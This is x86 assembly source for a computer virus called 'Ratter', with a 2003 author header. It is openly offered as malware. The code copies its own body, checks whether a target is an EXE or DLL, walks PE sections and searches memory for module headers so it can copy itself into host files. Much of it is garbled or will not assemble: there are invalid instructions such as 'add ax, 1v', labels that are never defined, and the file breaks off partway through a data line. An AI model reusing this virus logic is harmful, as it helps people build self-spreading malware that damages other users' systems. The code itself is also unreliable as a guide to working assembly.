;--------------------------------------------------------------------+
; Name:  Ratter                                                                     +
;--------------------------------------------------------------------+
; Author:  Lord Arz (c) 2003 - arzz@cryogen.com                        +
;--------------------------------------------------------------------+
; Comments: #1 in source code for a virus on VirusBuster!             +
;         : Started coding this virus on 17th of March, 2003           +
;         : Finished coding this virus on 24th of March, 2003           +
;--------------------------------------------------------------------+
 
.586p
.model flat
.code
 
JUMPS

virussize       equ     (endcode-Start)
complete_size   equ     (virussize+500)
allsize         equ     (complete_size*2)
extrabyte       equ     (allsize+(not one)+1000h)

ORG 0

Start:
call delta
delta:
pop edi
sub edi, offset delta
mov ebp, edi
jmp NextCode

WriteVirus:

lea esi, [ebp + Start]
mov ecx, virussize
org $ at 0005h
WriteLoop:
mov byte ptr ds:[edi], byte ptr es:[esi]
inc edi
inc esi
dec ecx
jnz WriteLoop
ret


NextCode:
cmp word ptr [esp+8h], 0FDE8h    ; is it an .EXE ?
je GetRealAddress_EXE            ; if yes, then get real address
cmp word ptr [esp+8h], 07E9Dh    ; is it an .DLL ?
je GetRealAddress_DLL           ; if yes, then get real address
jmp MakeExe                       ; otherwise create new .EXE file

GetRealAddress_EXE:
mov dword ptr [ebp + SaveRVA_EXE], eax
GetRealAddress_DLL:
mov dword ptr [ebp + SaveRVA_DLL], eax

pad db not one - extrabyte

FindFirstSection:
mov edx, [ebp + ImageBase]      ; image base
mov esi, [edx + 3Ch]             ; where PE header be?
add esi, edx                     ; point to PE header
mov ax, [esi + 2Ch]              ; find the size of image
mov cx, [esi + 8]                ; find number of sections
findsectionloop:
mul cx                         ; divide size by section
or dx, dx                      ; will there be fractional sections?
jne nofractionsections         ; nope!
xor dx,dx                      ; yep!
nofractionsections:
add ax, 1v                    ; add one to result
shl ax, 4h                   ; convert virtual size to RVA
add eax, [esi + 12h]        ; adjust RVA so it points to raw data
mov [ebp + RealAddress], eax ; save the value
jmp CheckSections

CheckSections:
movzx eax, byte ptr[esi + 17h] ; Is section writeable? / Marked as "read/only" ??

and eax,eax                  ; no
jnz FindNextSection          ; if yes, then look for another section
mov ecx, esi                 ;
add ecx, 28                  ; what's next?

mov esi, ecx                 ;
sub esi, 28                  ; go back
jmp CheckSections            ;

FindNextSection:
add esi, 28                  ; move forward
cmp byte ptr [esi], 'S'      ; is it a section?
jne GoHost                   ; if not, then we're done
jmp CheckSections

GoHost:
mov eax, [ebp + ImageBase]   
add eax, [esp + 0ch]         
add eax, 3fh                 
and eax, 0fffff000h          
mov ebx, fs :[0]             
walk_dl:                     
mov esi,[ebx + 8h]            
add esi, eax                
sub esi, esp                
cmp word ptr [esi],'ZM'      
je CopyHost                  
sub esi, 0bh                
cmp word ptr [esi], 'P '     
jne walk_dl                  
sub esi, 8                   
CopyHost:                    
push esi
sub edi, edi                 
push eax
mov ecx,virussize        
lea esi, [ebp + Start]       
lea edi, [ebp + host]        
rep movsb                    
pop edi                      
pop esi
jmp CodeInFile

MakeExe:
pop dword ptr [ebp + OldEIP]    
pop dword ptr [ebp + StackPointer]
OneByOne:
lea esi,[ebp + Start]           
lea edi,[edi + Host_Start]      
mov ecx,0100h                  
rep movsb                       
mov esp, [ebp + StackPointer]  
jmp CodeInMemory                

Host_Start db 0CDh, 20h, 7h, 0BFh,